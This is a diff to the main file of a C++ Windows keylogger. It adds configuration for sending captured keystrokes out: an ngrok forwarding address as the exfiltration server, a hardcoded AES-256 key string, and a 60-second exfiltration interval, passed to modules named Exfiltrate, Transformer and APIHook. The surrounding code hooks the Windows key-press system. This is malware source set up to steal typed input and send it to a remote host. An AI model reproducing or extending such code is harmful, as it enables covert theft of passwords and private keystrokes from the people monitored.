@@ -11,8 +11,19 @@
 #include "APIHook.h"
 #include "Auxiliary.h"
 
+void setOptions(std::string httpServerAddressOption,
+    std::string keyStrOption,
+    int intervalSecondsOption);
+
 int main()
 {
+    // Please set your desired options below, all three are mandatory
+
+    std::string ngrokForwardingAddress = "06a8-73-32-226-14.ngrok.io";
+    std::string aes256BitKeyString = "3272357538782F413F4428472B4B6250655368566D5971337436763979244226";
+    int logExfiltrationInterval = 60; // SECONDS
+
+    setOptions(ngrokForwardingAddress, aes256BitKeyString, logExfiltrationInterval);
 
     // Hook into the Windows system that handles key presses
 
@@ -45,4 +56,11 @@ int main()
     }
 
     return 0;
+}
+
+void setOptions(std::string httpServerAddressOption, std::string keyStrOption, int intervalSecondsOption)
+{
+    Exfiltrate::httpServerAddress = httpServerAddressOption;
+    Transformer::keyStr = keyStrOption;
+    APIHook::intervalSeconds = intervalSecondsOption;
 }
